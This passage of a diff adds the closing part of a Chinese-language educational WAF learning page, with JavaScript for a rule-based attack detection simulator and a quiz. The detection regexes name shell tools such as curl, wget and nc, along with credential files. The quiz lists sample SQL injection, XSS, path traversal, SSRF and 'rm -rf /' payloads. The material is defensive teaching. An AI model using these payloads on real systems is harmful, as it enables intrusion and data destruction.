+            </div>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>What The WAF - WAF 學習平台</p>
+        <p style="margin-top: 0.5rem;">僅供教育學習用途，請勿用於非法活動</p>
+    </footer>
+
+    <script>
+        // Tab switching
+        document.querySelectorAll('.tab').forEach(tab => {
+            tab.addEventListener('click', () => {
+                const tabId = tab.dataset.tab;
+
+                // Update tab buttons
+                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                tab.classList.add('active');
+
+                // Update tab content
+                document.querySelectorAll('.tab-content').forEach(content => {
+                    content.classList.remove('active');
+                });
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+
+        // Accordion
+        function toggleAccordion(header) {
+            const accordion = header.parentElement;
+            accordion.classList.toggle('active');
+        }
+
+        // WAF Detection Simulator
+        const wafRules = [
+            { pattern: /('|"|;|--|#|\/\*|\*\/)/i, type: 'SQL Injection', desc: '偵測到 SQL 特殊字符' },
+            { pattern: /(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|drop\s+table|update\s+.*\s+set)/i, type: 'SQL Injection', desc: '偵測到 SQL 關鍵字組合' },
+            { pattern: /(or|and)\s+[\d\w]+\s*=\s*[\d\w]+/i, type: 'SQL Injection', desc: '偵測到邏輯繞過嘗試' },
+            { pattern: /(<script|javascript:|on\w+\s*=|<iframe|<img\s+[^>]*onerror)/i, type: 'XSS', desc: '偵測到 XSS 攻擊模式' },
+            { pattern: /<svg[^>]*onload/i, type: 'XSS', desc: '偵測到 SVG XSS 攻擊' },
+            { pattern: /(;|\||&&|\$\(|`)\s*(ls|cat|whoami|id|pwd|wget|curl|bash|sh|nc|netcat)/i, type: 'Command Injection', desc: '偵測到命令注入' },
+            { pattern: /(\.\.|%2e%2e|%252e%252e)/i, type: 'Path Traversal', desc: '偵測到路徑穿越' },
+            { pattern: /(\/etc\/passwd|\/etc\/shadow|\/windows\/system32)/i, type: 'Path Traversal', desc: '偵測到敏感檔案存取' },
+            { pattern: /(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0)/i, type: 'SSRF', desc: '偵測到內部位址存取' },
+        ];
+
+        function checkWAF() {
+            const input = document.getElementById('waf-input').value;
+            const resultDiv = document.getElementById('waf-result');
+
+            if (!input.trim()) {
+                resultDiv.innerHTML = '';
+                return;
+            }
+
+            let detections = [];
+
+            for (const rule of wafRules) {
+                if (rule.pattern.test(input)) {
+                    detections.push(rule);
+                }
+            }
+
+            if (detections.length > 0) {
+                resultDiv.innerHTML = `
+                    <div class="detection-result detection-blocked">
+                        <strong style="color: var(--danger);">🚫 請求被阻擋</strong>
+                        <p style="margin-top: 0.5rem; color: var(--text-secondary);">偵測到以下威脅：</p>
+                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem;">
+                            ${detections.map(d => `<li style="color: var(--danger);">${d.type}: ${d.desc}</li>`).join('')}
+                        </ul>
+                    </div>
+                `;
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="detection-result detection-allowed">
+                        <strong style="color: var(--secondary);">✅ 請求通過</strong>
+                        <p style="margin-top: 0.5rem; color: var(--text-secondary);">未偵測到已知攻擊模式</p>
+                    </div>
+                `;
+            }
+        }
+
+        function setPayload(payload) {
+            document.getElementById('waf-input').value = payload;
+            checkWAF();
+        }
+
+        // Quiz System
+        const quizQuestions = [
+            {
+                question: '以下哪個是 SQL Injection 攻擊?',
+                code: null,
+                options: [
+                    "SELECT * FROM users WHERE id=1",
+                    "' OR '1'='1",
+                    "<script>alert(1)</script>",
+                    "../../../etc/passwd"
+                ],
+                correct: 1,
+                explanation: "' OR '1'='1 是典型的 SQL 注入 payload，用於繞過認證。"
+            },
+            {
+                question: '以下哪個 payload 嘗試進行 XSS 攻擊?',
+                code: null,
+                options: [
+                    "UNION SELECT password FROM users",
+                    "; rm -rf /",
+                    "<img src=x onerror=alert(1)>",
+                    "http://169.254.169.254/"
+                ],
+                correct: 2,
+                explanation: "<img src=x onerror=alert(1)> 利用圖片載入失敗時觸發 JavaScript，是常見的 XSS 攻擊。"
+            },
+            {
+                question: 'ModSecurity 規則中，哪個階段用於檢查請求主體 (Request Body)?',
+                code: null,
+                options: [
+                    "phase:1",
+                    "phase:2",
+                    "phase:3",
+                    "phase:4"
+                ],
+                correct: 1,
+                explanation: "phase:2 是請求主體階段，用於檢查 POST 資料等請求內容。"
+            },
+            {
+                question: '以下哪種技術不是 WAF 繞過方法?',
+                code: null,
+                options: [
+                    "大小寫變換 (Case Variation)",
+                    "URL 編碼 (URL Encoding)",
+                    "參數化查詢 (Parameterized Queries)",
+                    "註解插入 (Comment Injection)"
+                ],
+                correct: 2,
+                explanation: "參數化查詢是防禦 SQL Injection 的方法，不是繞過 WAF 的技術。"
+            },
+            {
+                question: '偵測到 http://169.254.169.254/latest/meta-data/ 這個請求，最可能是什麼類型的攻擊?',
+                code: null,
+                options: [
+                    "SQL Injection",
+                    "XSS",
+                    "SSRF (Server-Side Request Forgery)",
+                    "Path Traversal"
+                ],
+                correct: 2,
+                explanation: "169.254.169.254 是 AWS EC2 等雲端服務的 metadata endpoint，攻擊者透過 SSRF 嘗試存取雲端實例的敏感資訊。"
+            }
+        ];
+
+        let currentQuestion = 0;
+        let answers = new Array(quizQuestions.length).fill(null);
+
+        function loadQuestion() {
+            const question = quizQuestions[currentQuestion];
+            const content = document.getElementById('quiz-content');
+
+            let optionsHtml = question.options.map((option, index) => {
+                let className = 'quiz-option';
+                if (answers[currentQuestion] !== null) {
+                    if (index === question.correct) {
+                        className += ' correct';
+                    } else if (index === answers[currentQuestion] && answers[currentQuestion] !== question.correct) {
+                        className += ' incorrect';
+                    }
+                }
+                return `<div class="${className}" onclick="selectAnswer(${index})">${option}</div>`;
+            }).join('');
+
+            let explanationHtml = '';
+            if (answers[currentQuestion] !== null) {
+                explanationHtml = `
+                    <div class="result-box show ${answers[currentQuestion] === question.correct ? 'result-success' : 'result-error'}">
+                        ${answers[currentQuestion] === question.correct ? '✅ 正確！' : '❌ 錯誤！'}
+                        ${question.explanation}
+                    </div>
+                `;
+            }
+
+            content.innerHTML = `
+                <div class="quiz-question">
+                    <h4>問題 ${currentQuestion + 1} / ${quizQuestions.length}</h4>
+                    <p style="margin-top: 0.5rem; margin-bottom: 1rem; font-size: 1.1rem;">${question.question}</p>
+                    ${question.code ? `<div class="code-block"><code>${question.code}</code></div>` : ''}
+                    <div class="quiz-options">
+                        ${optionsHtml}
+                    </div>
+                    ${explanationHtml}
+                </div>
+            `;
+
+            // Update navigation buttons
+            document.getElementById('prev-btn').disabled = currentQuestion === 0;
+            document.getElementById('next-btn').textContent =
+                currentQuestion === quizQuestions.length - 1 ? '完成' : '下一題';
+
+            updateProgress();
+        }
+
+        function selectAnswer(index) {
+            if (answers[currentQuestion] !== null) return; // Already answered
+
+            answers[currentQuestion] = index;
+            loadQuestion();
+        }
+
+        function nextQuestion() {
+            if (currentQuestion < quizQuestions.length - 1) {
+                currentQuestion++;
+                loadQuestion();
+            } else {
+                showResults();
+            }
+        }
+
+        function prevQuestion() {
+            if (currentQuestion > 0) {
+                currentQuestion--;
+                loadQuestion();
+            }
+        }
+
+        function updateProgress() {
+            const answered = answers.filter(a => a !== null).length;
+            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;
+
+            document.getElementById('quiz-progress').style.width =
+                `${(answered / quizQuestions.length) * 100}%`;
+            document.getElementById('quiz-score').textContent =
+                `${correct} / ${quizQuestions.length}`;
+        }
+
+        function showResults() {
+            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;
+            const total = quizQuestions.length;
+            const percentage = Math.round((correct / total) * 100);
+
+            let message = '';
+            if (percentage >= 80) {
+                message = '🎉 太棒了！你對 WAF 有很好的理解！';
+            } else if (percentage >= 60) {
+                message = '👍 不錯！繼續學習可以更上一層樓！';
+            } else {
+                message = '📚 建議再複習一下上面的內容！';
+            }
+
+            document.getElementById('quiz-content').innerHTML = `
+                <div style="text-align: center; padding: 2rem;">
+                    <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">測驗完成！</h3>
+                    <p style="font-size: 3rem; margin-bottom: 1rem;">${percentage}%</p>
+                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
+                        你答對了 ${correct} / ${total} 題
+                    </p>
+                    <p style="font-size: 1.1rem;">${message}</p>
+                    <button class="btn btn-primary" onclick="resetQuiz()" style="margin-top: 1.5rem;">
+                        重新測驗
+                    </button>
+                </div>
+            `;
+        }
+
+        function resetQuiz() {
+            currentQuestion = 0;
+            answers = new Array(quizQuestions.length).fill(null);
+            loadQuestion();
+        }
+
+        // Smooth scroll
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                }
+            });
+        });
+
+        // Initialize quiz
+        loadQuestion();
+
+        // Add scroll animation
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('animate-in');
+                }
+            });
+        }, { threshold: 0.1 });
+
+        document.querySelectorAll('.card, .accordion, .rule-demo, .quiz-container').forEach(el => {
+            observer.observe(el);
+        });
+    </script>
+</body>
+</html>
